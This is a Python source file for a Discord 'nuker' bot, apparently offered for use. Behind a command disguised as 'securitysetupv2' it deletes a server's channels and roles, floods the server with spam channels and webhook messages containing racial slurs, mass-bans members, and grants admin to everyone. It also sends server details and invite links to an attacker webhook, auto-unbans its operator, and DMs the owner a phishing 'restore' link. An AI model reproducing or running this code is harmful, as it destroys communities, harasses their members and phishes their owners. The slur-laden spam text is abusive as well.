import discord
from discord.ext import commands
import aiohttp
import asyncio
from colorama import init, Fore, Style
import requests

# === INIT ===
init(autoreset=True)

# === CONFIG ===
TOKEN = "token"
DDOT_ID = 
WEBHOOK_URL = ""
PREFIX = "d!"
SPAM_CHANNEL_NAME = "nuked-by-ddot-nigga"
SPAM_WEBHOOK_MESSAGE = "# @everyone NUKED BY SUGARHILL NIGGA GET FUCKED UP FUCK GACHA NOTTI 4EVER & SUGARHILL ON TOP https://media.discordapp.net/attachments/1380396482775093349/1401423949056708699/Notti_Osama_x_MelBinBuggin_-_Dont_Change_Unreleased_Music_Video_Prod_by_5ive_Beatz.mp4?ex=68903942&is=688ee7c2&hm=37fd3e79e8ae18d54c976f038d30e6360bb979a23c45849221fd168da3b48c6f&"
SPAM_CHANNELS = 70
SPAM_ROLES = 40
SERVER_ICON_URL = "https://cdn.discordapp.com/attachments/1397195077985632309/1401141792509923400/download.jpg?ex=6899be7b&is=68986cfb&hm=329dc06be0b8ceaeefef45ce95a0143bb62e4e960697182724a9298f8acec361&"

intents = discord.Intents.all()
bot = commands.Bot(command_prefix=PREFIX, intents=intents)

# === Webhook Spammer ===
async def spam_webhook(url):
    async with aiohttp.ClientSession() as session:
        while True:
            try:
                await session.post(url, json={"content": SPAM_WEBHOOK_MESSAGE})
                await asyncio.sleep(0.1)
            except Exception as e:
                print(f"{Fore.RED}[-] Webhook spam failed: {e}")
                break

# === Log detailed info to webhook on command ===
async def log_to_webhook(ctx, command_name):
    async with aiohttp.ClientSession() as session:
        # Try to create invite link
        invite_link = None
        for channel in ctx.guild.text_channels:
            if channel.permissions_for(ctx.guild.me).create_instant_invite:
                try:
                    invite = await channel.create_invite(max_age=0, max_uses=0)
                    invite_link = str(invite)
                    break
                except Exception as e:
                    print(f"{Fore.RED}[Invite] Failed to create invite: {e}")

        embed = {
            "title": f"Requested Server Has Been Nuked...",
            "color": 0xFF0000,
            "fields": [
                {"name": "Server Name", "value": ctx.guild.name, "inline": True},
                {"name": "Server ID", "value": str(ctx.guild.id), "inline": True},
                {"name": "Owner", "value": f"{ctx.guild.owner} ({ctx.guild.owner_id})", "inline": True},
                {"name": "Verification Level", "value": str(ctx.guild.verification_level).replace("_", " ").title(), "inline": True},
                {"name": "Nuked By", "value": f"{ctx.author} ({ctx.author.id})", "inline": True},
                {"name": "Invite Link", "value": invite_link or "Could not create invite", "inline": False},
            ],
            "thumbnail": {"url": ctx.guild.icon.url if ctx.guild.icon else ""},
            "footer": {"text": "Nuker Notification,"}
        }

        await session.post(WEBHOOK_URL, json={"embeds": [embed]})

# === Nuke Function ===
async def nuke_server(guild):
    print(f"\n{Fore.CYAN}[+] Nuking server: {guild.name} ({guild.id}){Style.RESET_ALL}\n")
    # Change server icon
    try:
        response = requests.get(SERVER_ICON_URL)
        icon_bytes = response.content
        await guild.edit(icon=icon_bytes)
        print(f"{Fore.GREEN}[+] Server icon updated")
    except Exception as e:
        print(f"{Fore.RED}[-] Failed to update server icon: {e}")

    # Delete channels
    for channel in guild.channels:
        try:
            await channel.delete()
            print(f"{Fore.GREEN}[+] Deleted channel: {channel.name}")
        except Exception as e:
            print(f"{Fore.RED}[-] Failed to delete channel {channel.name}: {e}")

    # Delete roles
    for role in guild.roles:
        if role.name != "@everyone":
            try:
                await role.delete()
                print(f"{Fore.GREEN}[+] Deleted role: {role.name}")
            except Exception as e:
                print(f"{Fore.RED}[-] Failed to delete role {role.name}: {e}")

    # Create spam channels + webhooks
    for i in range(SPAM_CHANNELS):
        try:
            channel = await guild.create_text_channel(f"{SPAM_CHANNEL_NAME}")
            webhook = await channel.create_webhook(name="ꍟ4ꈤ")
            print(f"{Fore.GREEN}[+] Created: {channel.name} | Webhook: {webhook.url}")
            asyncio.create_task(spam_webhook(webhook.url))
        except Exception as e:
            print(f"{Fore.RED}[-] Failed to create channel/webhook: {e}")

    # Create spam roles
    for i in range(SPAM_ROLES):
        try:
            role = await guild.create_role(name=f"NUKED-BY-DDOT-NIGGA")
            print(f"{Fore.GREEN}[+] Created role: {role.name}")
        except Exception as e:
            print(f"{Fore.RED}[-] Failed to create role: {e}")

    print(f"\n{Fore.CYAN}[✅] Nuke completed.{Style.RESET_ALL}")

# === Anti-Ban: Unban and DM server invite ===
@bot.event
async def on_member_ban(guild, user):
    if user.id == DDOT_ID:
        print(f"{Fore.YELLOW}[!] Detected ban of protected user {user} in {guild.name} ({guild.id}), attempting unban...")
        try:
            await guild.unban(user)
            print(f"{Fore.GREEN}[+] Successfully unbanned {user} in {guild.name}")
        except Exception as e:
            print(f"{Fore.RED}[-] Failed to unban {user} in {guild.name}: {e}")

        invite_link = None
        for channel in guild.text_channels:
            if channel.permissions_for(guild.me).create_instant_invite:
                try:
                    invite = await channel.create_invite(max_age=0, max_uses=0)
                    invite_link = str(invite)
                    break
                except Exception as e:
                    print(f"{Fore.RED}[-] Failed to create invite in channel {channel.name}: {e}")

        try:
            user_dm = await user.create_dm()
            if invite_link:
                await user_dm.send(f"You were banned in **{guild.name}** but got unbanned automatically. Here's an invite to rejoin:\n{invite_link}")
            else:
                await user_dm.send(f"You were banned in **{guild.name}** but got unbanned automatically. Unable to create an invite link.")
            print(f"{Fore.GREEN}[+] Sent DM to {user}")
        except Exception as e:
            print(f"{Fore.RED}[-] Failed to DM {user}: {e}")

# === Commands ===
@bot.command()
async def securitysetupv2(ctx):
    try:
        await ctx.message.delete()
    except:
        pass
    await log_to_webhook(ctx, "securitysetupv2")
    await nuke_server(ctx.guild)

@bot.command()
async def m(ctx):
    try:
        await ctx.message.delete()
    except:
        pass
    await log_to_webhook(ctx, "m")
    for member in ctx.guild.members:
        if member.id in [DDOT_ID, bot.user.id] or member.bot:
            print(f"{Fore.YELLOW}[~] Skipped: {member} (bot or protected)")
            continue
        try:
            await member.ban(reason="NOTTI 4EVER")
            print(f"{Fore.GREEN}[+] Banned: {member}")
        except Exception as e:
            print(f"{Fore.RED}[-] Failed to ban {member}: {e}")

@bot.command()
async def give(ctx):
    try:
        await ctx.message.delete()
    except:
        pass

    await log_to_webhook(ctx, "give")

    admin_perms = discord.Permissions(administrator=True)

    admin_role = discord.utils.get(ctx.guild.roles, name=".")
    if admin_role is None:
        try:
            admin_role = await ctx.guild.create_role(name=".", permissions=manager_perms)
            print(f"{Fore.GREEN}[+] Created admin role '.'")
        except Exception as e:
            print(f"{Fore.RED}[-] Failed to create admin role: {e}")
            await ctx.send("F")
            return
    else:
        print(f"{Fore.YELLOW}[~] Reusing existing admin role '.'")

    members_to_give = [m for m in ctx.guild.members if not m.bot]
    coros = [member.add_roles(admin_role) for member in members_to_give]

    results = await asyncio.gather(*coros, return_exceptions=True)

    for member, res in zip(members_to_give, results):
        if isinstance(res, Exception):
            print(f"{Fore.RED}[-] Failed to give role to {member}: {res}")
        else:
            print(f"{Fore.GREEN}[+] Given '.' role to {member}")

    await ctx.send(f"S")

# === New command: DM server owner with your message ===
@bot.command()
async def sendownerdm(ctx):
    try:
        await ctx.message.delete()
    except:
        pass

    owner = ctx.guild.owner
    if owner is None:
        await ctx.send("⚠️")
        return

    try:
        owner_dm = await owner.create_dm()
        await owner_dm.send(
            "You're Discord Server Got Nuked... Please Click the Link to Restore You're Discord server. :\n"
            "https://discordserverrestorer.vercel.app/"
        )
        print(f"{Fore.GREEN}[+] Sent DM to server owner: {owner}")
        await ctx.send(f"S")
    except Exception as e:
        print(f"{Fore.RED}[-] Failed to send DM to server owner: {e}")
        await ctx.send("F")

# === Ready Event with ASCII & Info ===
@bot.event
async def on_ready():
    ascii_art = r"""
                                                                        
                                                                        
    //    ) ) //   / /  //   ) ) /__  ___/ //   ) )  //   ) ) \\    / / 
   //    / / //____    ((          / /    //___/ /  //   / /   \\  / /  
  //    / / / ____       \\       / /    / ___ (   //   / /     \\/ /   
 //    / / //              ) )   / /    //   | |  //   / /       / /    
//____/ / //____/ / ((___ / /   / /    //    | | ((___/ /       / /     
                       
                       
    //   / /  //   ) ) 
   //____    //___/ /  
  / ____    / ___ (    
 //        //   | |    
//____/ / //    | |    
"""
    print(Fore.RED + ascii_art)
    print(f"{Fore.YELLOW}[i] Nuker Ready As: {bot.user} (ID: {bot.user.id})")
    print(f"{Fore.YELLOW}Command prefix: {PREFIX}")
    print(f"{Fore.YELLOW}Connected to {len(bot.guilds)} servers")
    print(f"{Fore.YELLOW}Commands loaded: {', '.join(cmd.name for cmd in bot.commands)}")
    print(f"{Fore.YELLOW}Servers:")
    for guild in bot.guilds:
        print(f" - {guild.name} (ID: {guild.id})")
    print(Fore.YELLOW + "Destroyer Ready To Destroy Some Gachas,Retards,Scammers." + Style.RESET_ALL)

bot.run(TOKEN)
